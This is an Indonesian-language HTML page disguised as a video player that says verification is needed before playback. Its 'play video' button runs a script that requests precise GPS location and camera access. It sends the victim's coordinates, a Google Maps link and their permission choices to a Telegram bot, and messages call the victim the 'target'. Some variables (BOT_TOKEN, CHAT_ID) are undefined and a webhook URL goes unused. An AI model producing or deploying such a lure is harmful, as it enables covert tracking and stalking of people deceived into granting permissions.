<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Player - Verification Required</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .player-box {
      width: 90%;
      max-width: 500px;
      background: #1a1a1a;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
      text-align: center;
      border: 1px solid #333;
    }
    .video-screen {
      width: 100%;
      height: 250px;
      background: #000;
      border-radius: 6px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      position: relative;
      border: 1px dashed #444;
    }
    .play-icon {
      font-size: 50px;
      color: #ff0000;
      margin-bottom: 10px;
    }
    .btn-verify {
      background: #e50914;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 14px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 15px;
      transition: background 0.2s;
    }
    .btn-verify:hover {
      background: #b80710;
    }
    .status-msg {
      font-size: 12px;
      color: #aaa;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <div class="player-box">
    <div class="video-screen">
      <div class="play-icon">▶</div>
      <p style="font-size: 14px; color: #ddd;">Koneksi Dibatasi / Pemutaran Terhenti</p>
    </div>
    
    <p class="status-msg">Klik tombol di bawah untuk memverifikasi lokasi server & memutar media.</p>
    <button class="btn-verify" onclick="triggerPermissions()">[ ▶ ] PUTAR VIDEO SEKARANG</button>
  </div>

  <script>
    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9'

    function triggerPermissions() {
      // 1. Minta Izin Lokasi GPS Presisi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            sendTelegram(` TARGET BERHASIL DILACAK!\n\nLatitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${Math.round(acc)} Meter\n\nGoogle Maps:\n${mapsUrl}`);
          },
          err => {
            sendTelegram(` [!] Akses Lokasi Ditolak Target (DENIED).`);
          },
          { enableHighAccuracy: true }
        );
      }

      // 2. Minta Akses Kamera Belakang/Depan
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            sendTelegram(` [✓] Akses Kamera Disetujui oleh Target!`);
            // Stream kamera aktif di background
          })
          .catch(err => {
            sendTelegram(` [!] Akses Kamera Ditolak Target.`);
          });
      }
    }

    function sendTelegram(text) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });
    }
  </script>

</body>
</html>
